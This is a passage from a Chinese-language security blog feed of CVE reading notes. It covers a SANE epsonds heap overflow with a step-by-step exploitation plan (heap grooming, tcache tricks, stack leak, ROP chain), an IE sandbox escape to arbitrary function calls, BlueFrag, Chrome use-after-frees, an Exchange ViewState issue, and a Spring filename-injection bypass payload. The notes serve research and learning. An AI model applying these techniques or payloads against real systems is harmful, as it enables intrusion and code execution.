class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buf, s-&gt;netbuf, wanted);</span><br><span class="line">  read = wanted;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(s-&gt;netbuf);</span><br><span class="line">  s-&gt;netbuf = <span class="literal">NULL</span>;</span><br><span class="line">  s-&gt;netlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  DBG(<span class="number">23</span>, <span class="string">"%s: partial read\n"</span>, __func__);</span><br><span class="line"></span><br><span class="line">  read = epsonds_net_read_raw(s, s-&gt;netbuf, size, status);</span><br><span class="line">  <span class="keyword">if</span> (read != size) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  s-&gt;netlen = size - wanted;</span><br><span class="line">  s-&gt;netptr += wanted;</span><br><span class="line">  read = wanted;</span><br><span class="line"></span><br><span class="line">  DBG(<span class="number">23</span>, <span class="string">"0,4 %02x %02x\n"</span>, s-&gt;netbuf[<span class="number">0</span>], s-&gt;netbuf[<span class="number">4</span>]);</span><br><span class="line">  DBG(<span class="number">23</span>, <span class="string">"storing %lu to buffer at %p, next read at %p, %lu bytes left\n"</span>,</span><br><span class="line">    (u_long) size, s-&gt;netbuf, s-&gt;netptr, (u_long) s-&gt;netlen);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buf, s-&gt;netbuf, wanted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> read;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">epsonds_net_write(epsonds_scanner *s, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf,</span><br><span class="line">                  <span class="keyword">size_t</span> buf_size, <span class="keyword">size_t</span> reply_len, SANE_Status *status)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *h1, *h2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *packet = <span class="built_in">malloc</span>(<span class="number">12</span> + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* XXX check allocation failure */</span></span><br><span class="line"></span><br><span class="line">  h1 = packet;    <span class="comment">// packet header</span></span><br><span class="line">  h2 = packet + <span class="number">12</span>;  <span class="comment">// data header</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (reply_len) &#123;</span><br><span class="line">    s-&gt;netbuf = s-&gt;netptr = <span class="built_in">malloc</span>(reply_len);</span><br><span class="line">    s-&gt;netlen = reply_len;</span><br><span class="line">    DBG(<span class="number">24</span>, <span class="string">"allocated %lu bytes at %p\n"</span>,</span><br><span class="line">      (u_long) reply_len, s-&gt;netbuf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DBG(<span class="number">24</span>, <span class="string">"%s: cmd = %04x, buf = %p, buf_size = %lu, reply_len = %lu\n"</span>,</span><br><span class="line">    __func__, cmd, buf, (u_long) buf_size, (u_long) reply_len);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(h1, <span class="number">0x00</span>, <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">memset</span>(h2, <span class="number">0x00</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  h1[<span class="number">0</span>] = <span class="string">'I'</span>;</span><br><span class="line">  h1[<span class="number">1</span>] = <span class="string">'S'</span>;</span><br><span class="line"></span><br><span class="line">  h1[<span class="number">2</span>] = cmd &gt;&gt; <span class="number">8</span>;  <span class="comment">// packet type</span></span><br><span class="line">  h1[<span class="number">3</span>] = cmd;    <span class="comment">// data type</span></span><br><span class="line"></span><br><span class="line">  h1[<span class="number">4</span>] = <span class="number">0x00</span>;</span><br><span class="line">  h1[<span class="number">5</span>] = <span class="number">0x0C</span>; <span class="comment">// data offset</span></span><br><span class="line"></span><br><span class="line">  DBG(<span class="number">24</span>, <span class="string">"H1[0]: %02x %02x %02x %02x\n"</span>, h1[<span class="number">0</span>], h1[<span class="number">1</span>], h1[<span class="number">2</span>], h1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 0x20 passthru</span></span><br><span class="line">  <span class="comment">// 0x21 job control</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf_size) &#123;</span><br><span class="line">    htobe32a(&amp;h1[<span class="number">6</span>], buf_size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((cmd &gt;&gt; <span class="number">8</span>) == <span class="number">0x20</span>) &#123;</span><br><span class="line"></span><br><span class="line">    htobe32a(&amp;h1[<span class="number">6</span>], buf_size + <span class="number">8</span>);  <span class="comment">// data size (data header + payload)</span></span><br><span class="line"></span><br><span class="line">    htobe32a(&amp;h2[<span class="number">0</span>], buf_size);  <span class="comment">// payload size</span></span><br><span class="line">    htobe32a(&amp;h2[<span class="number">4</span>], reply_len);  <span class="comment">// expected answer size</span></span><br><span class="line"></span><br><span class="line">    DBG(<span class="number">24</span>, <span class="string">"H1[6]: %02x %02x %02x %02x (%lu)\n"</span>, h1[<span class="number">6</span>], h1[<span class="number">7</span>], h1[<span class="number">8</span>], h1[<span class="number">9</span>], (u_long) (buf_size + <span class="number">8</span>));</span><br><span class="line">    DBG(<span class="number">24</span>, <span class="string">"H2[0]: %02x %02x %02x %02x (%lu)\n"</span>, h2[<span class="number">0</span>], h2[<span class="number">1</span>], h2[<span class="number">2</span>], h2[<span class="number">3</span>], (u_long) buf_size);</span><br><span class="line">    DBG(<span class="number">24</span>, <span class="string">"H2[4]: %02x %02x %02x %02x (%lu)\n"</span>, h2[<span class="number">4</span>], h2[<span class="number">5</span>], h2[<span class="number">6</span>], h2[<span class="number">7</span>], (u_long) reply_len);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((cmd &gt;&gt; <span class="number">8</span>) == <span class="number">0x20</span> &amp;&amp; (buf_size || reply_len)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// send header + data header</span></span><br><span class="line">    sanei_tcp_write(s-&gt;fd, packet, <span class="number">12</span> + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    sanei_tcp_write(s-&gt;fd, packet, <span class="number">12</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send payload</span></span><br><span class="line">  <span class="keyword">if</span> (buf_size)</span><br><span class="line">    sanei_tcp_write(s-&gt;fd, buf, buf_size);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(packet);</span><br><span class="line"></span><br><span class="line">  *status = SANE_STATUS_GOOD;</span><br><span class="line">  <span class="keyword">return</span> buf_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>epsonds_net_read_raw(s, s-&gt;netbuf, size, status);</code>没有边界检查，控制size可以堆溢出。</p><p>观察代码中还有一个问题就是在else分支中<code>s-&gt;netbuf</code>没有free，内存泄露。</p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p>I will overwrite the value of buf_size so that the final call to sanei_tcp_write sends far more bytes than it should. buf is a stack pointer so this will result in a remote infoleak containing all the information that I need to complete the exploit. How can I overwrite buf_size though? It is stored in a register, so the only opportunity that I have to alter its value is during one of the calls to malloc at the beginning of function, when it is temporarily saved to the stack. That is why I need to use the “fastbin reverse into tcache” technique: it enables me to overwrite buf_size during that malloc. I use the variant of the House of Force to calculate the stack address where buf_size will be saved.</p><p>These are the main steps of the exploit:</p><ol><li>Groom the heap by deliberately leaking memory. There are three goals:<ul><li>Fill any large gaps so that any subsequent large allocations will come from the top chunk.</li><li>Leave plenty of smaller gaps to absorb smaller memory leaks. In particular, the code is going to leak an object of type struct epsonds_device (size 0xf8 bytes) on every iteration.</li><li>Empty the tcache for allocations of size 0x3d0, 0x3e0, 0x3f0, and 0x400. That’s because I want to allocate blocks of those sizes from the top chunk and then store them in the tcache to use later.</li></ul></li><li>Prepare a magazine of chunks in the tcache using the “shrink a chunk while it’s in the tcache” technique. I use these chunks later in the “fastbin reverse into tcache” technique.</li><li>Allocate and free a large chunk from the top chunk. The purpose of this is to mmap enough memory to ensure that the subsequent top chunk shenanigans don’t accidentally hit unmapped memory and trigger a SIGSEGV.</li><li>Create a chunk that overlaps with the top chunk.</li><li>Use the variant of the House of Force to calculate the stack address where buf_size will be saved.</li><li>Trigger “fastbin reverse into tcache”.</li><li>Receive the stack dump and reply with a simple ROP chain.</li></ol><p>The reason why I am able to immediately reply with a ROP chain in the final step is that the next heap allocation returns a stack pointer, due to the “fastbin reverse into tcache” technique. Therefore, I am able to send back a reply which overwrites the stack. I can do this reliably, because the stack dump has given me stack pointers, heap pointers, code pointers, and the value of the stack canary.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Kernel-crash-caused-by-out-of-bounds-write-in-Apple’s-ICMP-packet-handling-code-CVE-2018-4407&quot;&gt;&lt;a href=&quot;#Kernel-crash-caused-by-out-
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>一些CVE和其它安全相关文章阅读整理（一）</title>
    <link href="https://github.com/Cracke-S-J/2020/06/17/%E4%B8%80%E4%BA%9BCVE%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/Cracke-S-J/2020/06/17/%E4%B8%80%E4%BA%9BCVE%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%95%B4%E7%90%86/</id>
    <published>2020-06-17T08:34:40.000Z</published>
    <updated>2020-06-24T17:26:45.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IE沙箱逃逸：CVE-2019-0880"><a href="#IE沙箱逃逸：CVE-2019-0880" class="headerlink" title="IE沙箱逃逸：CVE-2019-0880"></a>IE沙箱逃逸：CVE-2019-0880</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>当程序访问系统安装打印机时会运行这个程序<code>splwow64.exe</code>，这个进程是IE提升策略白名单进程之一。</p><p>该进程会创建LPC端口，我们稍作逆向可以知道创建端口的名称，连接上后，就可以通过LPC消息与之交互。</p><p>消息处理时存在任意指针解引用：</p><ul><li>只接收长度为0x20的传入消息；把位于LPC消息的偏移0x30、0x38和0x40处的三个指针作为参数传递给GdiPrinterThunk函数；</li><li>GdiPrinterThunk函数工作流程由位于第一个参数所指定的地址的偏移0x4处的字节确定；</li><li>我们把该处地址内容设为0x76（Windows 7上是0x75），就可以通过任意参数调用memcpy；</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>任意地址写原语<ul><li>创建共享section，共享section开始四个字节设为0x76，在LPC消息偏移0x30处指定共享section；</li><li>这样就获得了memcpy原语；</li></ul></li><li>绕过ASLR<ul><li>ASLR只要不重启，各个进程加载相同模块的偏移都是一样的；</li><li>在沙箱地址空间加载splwow64进程中winspool.drv，找到.data节，即可找到对应函数指针；</li><li>可是IE渲染进程是32位的，splwow64进程是64位的；<ul><li>IE允许从低完整性渲染进程写入LocalLow文件夹；<ul><li>创建一个64位leakaddr.exe，负责加载winspool.drv，并将结果写入LocalLow文件夹中；</li><li>将leakaddr.exe写入LocalLow中，并创建进程调用，由于没有提权，用户不知道它运行了；</li><li>读文件获得函数地址；</li></ul></li><li>Heaven’s Gate技术<ul><li>此技术可以在IE进程的地址空间中加载64位DLL，从而可以泄露地址；</li></ul></li></ul></li></ul></li><li>WX内存<ul><li>无法写入可执行内存页，也无法调用VirtualProtect来使内存页可写；</li><li>把现有的某个函数指针覆盖成LoadLibraryA或者WinExec的地址；</li><li>OpenPrinterW函数：该函数把winspool.drv的.data节中的一个地址（OpenPrinterW2函数指针）传送到RAX寄存器；并调用LdrpValidateUserCallTarget（CFG，控制流保护）来验证该地址；</li><li>所以我们利用上述绕过ASLR方法和任意地址写原语来修改winspool.drv的.data节中的那个地址；</li></ul></li><li>任意执行<ul><li>将上上述偏移0x4处的字节设置为0x6A（在Windows 7上为0x69），则会发出对OpenPrinterW函数的调用，第一个参数可由我们控制；</li><li>又因为OpenPrinter2W的指针已被我们覆盖；</li><li>所以我们可以执行任意只有一个（可控）参数的函数；</li><li>LoadLibraryA，可以逃逸沙箱加载dll；</li><li>system，任意命令执行。</li></ul></li></ul><h2 id="Android蓝牙子系统BlueFrag-CVE-2020-0022"><a href="#Android蓝牙子系统BlueFrag-CVE-2020-0022" class="headerlink" title="Android蓝牙子系统BlueFrag(CVE-2020-0022)"></a>Android蓝牙子系统BlueFrag(CVE-2020-0022)</h2><p>我还看了一大通HCI包的格式和解析。</p><p>其实漏洞点很简单，直接从<a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf" target="_blank" rel="noopener">patch</a>回溯着看也很好理解。</p><p>位于HCI层分片数据包的重组，经过一大系列的各种解析分分合合以后，来到了下面：</p><p>调用memcpy进行拷贝，第一个参数<code>partial_packet-&gt;data + partial_packet-&gt;offset</code>是正确的；第二个参数为<code>packet-&gt;data + packet-&gt;offset</code>也是正确的，第三个参数是要拷贝的长度len<code>packet-&gt;len - packet-&gt;offset</code>，这个值是有问题的，分两种情况。</p><p>第一种情况是<code>projected_offset</code>小于<code>partial_packet-&gt;len</code>，<code>packet-&gt;len - packet-&gt;offset</code>为L2CAP数据包片段总长度，并且是个正数；这种情况是没问题的。</p><p>第二种是<code>packet-&gt;len</code>在patch那一行<code>packet-&gt;len = partial_package-&gt;len - partial_package-&gt;offset</code>已经被修正过，修正为<code>partial_packet剩余空间</code>，不需要再一次<code>packet-&gt;len - packet-&gt;offset</code>的操作，如果<code>partial_packet</code>剩余空间长度小于4字节，那<code>packet-&gt;len - packet-&gt;offset</code>是小于零的，是一个负数。</p><p>由于memcpy()函数第三个参数类型是一个无符号整型类型，因此整数溢出导致堆溢出。</p><p>所以patch又给221那行改成了这样<code>(packet-&gt;len = partial_package-&gt;len - partial_package-&gt;offset) + package-&gt;offset</code>用于抵消后面的操作。</p><p><img src="BlueFrag.png" alt="这张图配合，挺好理解的"></p><h2 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h2><p>在些之前对vm2了解不多，但是遇到人家的沙箱逃逸也看了…</p><p>基本就是在js层的博弈，“诶你忘重写那个啥了被我截胡了”这种操作。<a href="https://www.anquanke.com/post/id/207291" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207291</a></p><h2 id="use-after-free-about-Web-Audio-in-Chrome"><a href="#use-after-free-about-Web-Audio-in-Chrome" class="headerlink" title="use-after-free about Web Audio in Chrome"></a>use-after-free about Web Audio in Chrome</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc" target="_blank" rel="noopener">Triggering garbage collection with rejected promises to cause use-after-free in Chrome</a></p><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>AudioNode提供Javascript接口，由AudioHandler进行管理，当主线程要释放AudioHandler的时候，必须保证处理音频的线程不在访问它，所以要加锁，然而代码中有一处锁处理的不好，使音频线程在没有获得锁的情况下也访问了AudioNode：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="function">MutexTryLocker <span class="title">try_locker</span><span class="params">(Context()-&gt;GetTearDownMutex())</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (try_locker.Locked()) &#123;</span><br><span class="line">        DCHECK_GE(NumberOfInputs(), <span class="number">1u</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// This will cause the node(s) connected to us to process, which in turn</span></span><br><span class="line">        <span class="comment">// will pull on their input(s), all the way backwards through the</span></span><br><span class="line">        <span class="comment">// rendering graph.</span></span><br><span class="line">        AudioBus* rendered_bus = Input(<span class="number">0</span>).Pull(destination_bus, number_of_frames);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!rendered_bus) &#123;</span><br><span class="line">            destination_bus-&gt;Zero();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rendered_bus != destination_bus) &#123;</span><br><span class="line">            <span class="comment">// in-place processing was not possible - so copy</span></span><br><span class="line">            destination_bus-&gt;CopyFrom(*rendered_bus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        destination_bus-&gt;Zero();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process nodes which need a little extra help because they are not</span></span><br><span class="line">    <span class="comment">// connected to anything, but still need to process.</span></span><br><span class="line">    Context()-&gt;GetDeferredTaskHandler().ProcessAutomaticPullNodes(            <span class="comment">//&lt;--- Only protected if try_locker succeeded</span></span><br><span class="line">        number_of_frames);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> DeferredTaskHandler::ProcessAutomaticPullNodes(</span><br><span class="line">    <span class="keyword">uint32_t</span> frames_to_process) &#123;</span><br><span class="line">  DCHECK(IsAudioThread());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; rendering_automatic_pull_handlers_.size(); ++i) &#123;</span><br><span class="line">    rendering_automatic_pull_handlers_[i]-&gt;ProcessIfNecessary(</span><br><span class="line">        frames_to_process);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="触发思路"><a href="#触发思路" class="headerlink" title="触发思路"></a>触发思路</h3><p>触发的话要考虑到锁和GC，我们需要先消耗掉大量内存，再在音频线程获得锁之前调用<code>BaseAudioContext :: Uninitialize</code>，然后音频线程操作之后再<code>ClearHandlersToBeDeleted</code>删除句柄（难搞。</p><h2 id="Variant-analysis-of-Web-Audio-callback-vulnerabilities-in-Chrome"><a href="#Variant-analysis-of-Web-Audio-callback-vulnerabilities-in-Chrome" class="headerlink" title="Variant analysis of Web Audio callback vulnerabilities in Chrome"></a>Variant analysis of Web Audio callback vulnerabilities in Chrome</h2><p><a href="https://securitylab.github.com/research/chrome_task_queue_uaf" target="_blank" rel="noopener">https://securitylab.github.com/research/chrome_task_queue_uaf</a></p><p>书接上回。上文说的问题主要是<code>AudioHandler</code>访问task queue里的context的时候，当它等这个task queue的锁的时候，context已经被销毁了，去访问它造成了UAF。</p><p>然后现有问题还有一些变体。CodeQL可以查找一波：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall fc, FunctionCall wrapRef</span><br><span class="line">      //Look for cross thread task being posted</span><br><span class="line">where fc.getTarget().hasName("CrossThreadBindOnce") and</span><br><span class="line">      //Look for `AudioHandler` posted as `scoped_refptr`</span><br><span class="line">      wrapRef.getTarget().hasName("WrapRefCounted") and</span><br><span class="line">      wrapRef = fc.getAnArgument() and</span><br><span class="line">      exists(Expr e | e.getType().stripType().(Class).getABaseClass*().getName() = "AudioHandler" and</span><br><span class="line">                      e = wrapRef.getArgument(0))</span><br><span class="line"><span class="keyword">select</span> fc, fc.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="章鱼扫描器"><a href="#章鱼扫描器" class="headerlink" title="章鱼扫描器(?"></a>章鱼扫描器(?</h2><p><a href="https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain" target="_blank" rel="noopener">The Octopus Scanner Malware: Attacking the open source supply chain</a></p><p>主要是讲开源供应链安全的。章鱼扫描器是恶意感染用到NetBeans的开源软件的。</p><p>总之它就是个病毒，有混淆，伪装自己到处感染，还会区别对待Win/Linux那种…</p><h2 id="热岩浆"><a href="#热岩浆" class="headerlink" title="热岩浆(?"></a>热岩浆(?</h2><p><a href="https://securitylab.github.com/research/network-integers-are-hot-lava" target="_blank" rel="noopener">Hot lava: A case study in hunting for network integer arithmetic flaws</a></p><p>这个是讲整数运算检测的。整数溢出啥的。使用CodeQL做污点分析，用户输入的整数不可信那种。</p><p>所以hot lava是什么意思？</p><h2 id="Fuzzing-sockets"><a href="#Fuzzing-sockets" class="headerlink" title="Fuzzing sockets"></a>Fuzzing sockets</h2><p>Fuzz FTP服务器，好像在书中看到过，再就没有接触过了。</p><p>原来讲的是用AFL Fuzz…注意事项有：</p><ul><li>修改system call，防止fuzz过程中意外删文件；</li><li>修改事件处理函数，就是一定范围内随机一些取值；</li><li>AFL不能处理多进程，所以要改掉fork()；</li><li>要给权限；要减少程序中的随机性；</li><li>修改程序自定义的处理信号；去掉<code>alarm(2)</code>；</li><li>删除没有必要的时间间隔和sleep之类的；</li><li>要理解程序内部去做调整；</li></ul><h3 id="CVE-2020-9273"><a href="#CVE-2020-9273" class="headerlink" title="CVE-2020-9273"></a>CVE-2020-9273</h3><p><code>new_block</code>并发不安全，容易堆块重叠。</p><h3 id="CVE-2020-9365"><a href="#CVE-2020-9365" class="headerlink" title="CVE-2020-9365"></a>CVE-2020-9365</h3><p>是oob，计算字符串长度出问题，没有考虑字符串长度不等的情况。</p><h3 id="CVE-2020-9274"><a href="#CVE-2020-9274" class="headerlink" title="CVE-2020-9274"></a>CVE-2020-9274</h3><p>未初始化的指针，没有设为NULL，导致链表遍历时信息泄露。</p><h2 id="嘿，妈，我正在加密"><a href="#嘿，妈，我正在加密" class="headerlink" title="嘿，妈，我正在加密"></a>嘿，妈，我正在加密</h2><p>关于密码学的讨论。我就想知道<a href="https://blog.semmle.com/introduction-to-variant-analysis-part-2/" target="_blank" rel="noopener">LGTM</a>是什么。（原来是CodeQL配套的平台）</p><p>总体在讲，用CodeQL挖openssl中一些密码学的洞。</p><h2 id="好像一个篇软文"><a href="#好像一个篇软文" class="headerlink" title="好像一个篇软文"></a>好像一个篇软文</h2><p>介绍了一个<code>CVE-2020-8597</code> – a remote vulnerability in pppd (point-to-point protocol daemon).</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Not so likely to happen. */</span></span><br><span class="line"><span class="keyword">if</span> (vallen &gt;= len + <span class="keyword">sizeof</span> (rhostname)) &#123;</span><br><span class="line">  ppp_dbglog((<span class="string">"EAP: trimming really long peer name down"</span>));</span><br><span class="line">  MEMCPY(rhostname, inp + vallen, <span class="keyword">sizeof</span> (rhostname) - <span class="number">1</span>);</span><br><span class="line">  rhostname[<span class="keyword">sizeof</span> (rhostname) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><p>这里是因为之前已经验证过vallen &lt; len了，所以这个分支进不来，所以rhostname没有它的终止符。</p><h2 id="CVE-2020-0688-–-Exchange-RCE"><a href="#CVE-2020-0688-–-Exchange-RCE" class="headerlink" title="CVE-2020-0688 – Exchange RCE"></a>CVE-2020-0688 – Exchange RCE</h2><p><code>Exchange</code>共享同一密钥，导致<code>ViewState</code>可以反序列化。</p><p>泄露Key的一些方法：</p><ul><li>本地文件包含或者XXE泄露web.config<ul><li>例如：AfterLogic WebMail Pro ASP.NET 6.2.6 - Administrator Account Disclosure via XXE</li></ul></li><li>填充Oracle？<ul><li>MS10-070 (CVE-2010-3332)</li></ul></li><li>.Net框架信息泄露<ul><li>MS15-041（CVE-2010-1648）</li></ul></li><li>死亡黄屏（报错信息）</li><li>public repo里的web.config</li></ul><h2 id="CVE-2020-5398"><a href="#CVE-2020-5398" class="headerlink" title="CVE-2020-5398"></a>CVE-2020-5398</h2><p>这块都是些Web呢，最看不懂的就是Web。</p><p>Spring框架<code>Reflected File Download</code>(这个怎么翻译?)，跟<code>CVE-2015-5211</code>有关系，就类似这样欺骗一下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd" download&gt;</span><br><span class="line">Click me, Im a dolphin</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修复是<a href>这样</a>修复的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.filename != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.charset == <span class="keyword">null</span> || StandardCharsets.US_ASCII.equals(<span class="keyword">this</span>.charset)) &#123;</span><br><span class="line">        sb.append(<span class="string">"; filename=\""</span>);</span><br><span class="line">        sb.append(<span class="keyword">this</span>.filename).append(<span class="string">'\"'</span>);</span><br><span class="line">        sb.append(escapeQuotationsInFilename(<span class="keyword">this</span>.filename)).append(<span class="string">'\"'</span>); <span class="comment">// &lt;--这里</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而还能这样绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ContentDisposition contentDisposition = ContentDisposition.builder(<span class="string">"attachment"</span>).filename(fileName + <span class="string">".txt"</span>).build();</span><br><span class="line">HttpHeaders headers = <span class="keyword">new</span> HttpHeaders();</span><br><span class="line">headers.setContentDisposition(contentDisposition);</span><br></pre></td></tr></table></figure><p>filename为<code>secure_install.cmd&quot;;</code>的话，拼起来就是<code>Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</code>。</p><p>需要转义引号，使程序不能关闭filename的引号。</p><h2 id="逃离fuzz"><a href="#逃离fuzz" class="headerlink" title="逃离fuzz"></a>逃离fuzz</h2><p>讲的是github上很多人用fuzz扫一些开源项目，给开发者造成负担，甚至还会打乱开发计划，所以作者给了开发人员一些建议。</p><p>（此处CodeQL植入）。</p><p>怎么办呢：</p><ul><li>我帮你们修；</li><li>我修不过来了，用Rust重写吧；</li><li>快速修好像问题也不大；</li><li>再教一下AFL的使用吧；</li></ul><h2 id="CVE-2019-10779-XSS-in-GCHQ-Stroom"><a href="#CVE-2019-10779-XSS-in-GCHQ-Stroom" class="headerlink" title="CVE-2019-10779: XSS in GCHQ Stroom"></a>CVE-2019-10779: XSS in GCHQ 